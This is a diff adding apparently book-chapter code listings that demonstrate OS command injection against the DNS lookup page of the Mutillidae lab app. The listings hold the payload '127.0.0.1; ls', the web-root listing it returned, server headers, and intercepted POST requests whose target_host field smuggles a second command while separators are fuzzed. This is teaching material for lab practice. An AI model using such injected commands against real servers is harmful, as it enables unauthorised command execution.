@@ -1,0 +1,182 @@
+//code 9.1
+127.0.0.1; ls
+
+----------------
+
+//code 9.2
+Server:        10.13.4.1
+Address:    10.13.4.1#53
+
+1.0.0.127.in-addr.arpa    name = localhost.
+
+add-to-your-blog.php
+ajax
+arbitrary-file-inclusion.php
+authorization-required.php
+back-button-discussion.php
+browser-info.php
+capture-data.php
+captured-data.php
+captured-data.txt
+classes
+client-side-control-challenge.php
+credits.php
+data
+database-offline.php
+directory-browsing.php
+dns-lookup.php
+document-viewer.php
+documentation
+framer.html
+framing.php
+hackers-for-charity.php
+home.php
+html5-storage.php
+images
+includes
+index.php
+installation.php
+javascript
+level-1-hints-page-wrapper.php
+login.php
+owasp-esapi-php
+page-not-found.php
+password-generator.php
+passwords
+pen-test-tool-lookup-ajax.php
+pen-test-tool-lookup.php
+php-errors.php
+phpinfo.php
+phpmyadmin
+phpmyadmin.php
+privilege-escalation.php
+process-commands.php
+redirectandlog.php
+register.php
+rene-magritte.php
+repeater.php
+robots-txt.php
+robots.txt
+secret-administrative-pages.php
+set-background-color.php
+set-up-database.php
+show-log.php
+site-footer-xss-discussion.php
+source-viewer.php
+sqlmap-targets.php
+ssl-enforced.php
+ssl-misconfiguration.php
+styles
+styling-frame.php
+styling.php
+test
+text-file-viewer.php
+upload-file.php
+usage-instructions.php
+user-agent-impersonation.php
+user-info-xpath.php
+user-info.php
+user-poll.php
+view-someones-blog.php
+view-user-privilege-level.php
+web-workers.php
+webservices
+xml-validator.php
+
+-----------------
+
+//code 9.3
+//monitor scanning
+
+root@kali:~# ping -c 1 127.0.0.1; ls
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.031/0.031/0.031/0.000 ms
+Desktop    Downloads   Music     Public     Videos Documents  juice-shop  Pictures  Templates  xml-attacks.txt
+
+---------------------
+
+//code 9.4
+Desktop    Downloads   Music     Public     Videos Documents  juice-shop  Pictures  Templates  xml-attacks.txt
+
+
+----------------
+
+//code 9.5
+2.2.14 OpenSSL/0.9.8k Phusion_Passenger/4.0.38 mod_perl/2.0.4 Perl/v5.10.1
+X-Powered-By: PHP/5.3.2-1ubuntu4.30
+Set-Cookie: PHPSESSID=m329900gup8bjmo6um5h6vp8v3; path=/
+Set-Cookie: showhints=1
+Logged-In-User: 
+Vary: Accept-Encoding
+Content-Length: 45622
+Connection: close
+Content-Type: text/html
+
+
+--------------------
+
+//code 9.6
+//with intercept on, capturing the request
+
+POST /mutillidae/index.php?page=dns-lookup.php HTTP/1.1
+Host: 192.168.2.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.2/mutillidae/index.php?page=dns-lookup.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+Cookie: showhints=1; PHPSESSID=m329900gup8bjmo6um5h6vp8v3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+target_host=127.0.0.1&dns-lookup-php-submit-button=Lookup+DNS
+
+-----------------------
+
+//code 9.7
+POST /mutillidae/index.php?page=dns-lookup.php HTTP/1.1
+Host: 192.168.2.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.2/mutillidae/index.php?page=dns-lookup.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+Cookie: showhints=1; PHPSESSID=m329900gup8bjmo6um5h6vp8v3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+target_host=127.0.0.1 cs ls &dns-lookup-php-submit-button=Lookup+DNS
+
+----------------------------
+
+//code 9.8
+//fuzzing symbol around the cs command
+
+POST /mutillidae/index.php?page=dns-lookup.php HTTP/1.1
+Host: 192.168.2.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.2/mutillidae/index.php?page=dns-lookup.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+Cookie: showhints=1; PHPSESSID=m329900gup8bjmo6um5h6vp8v3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+-----------------------------------
+
+
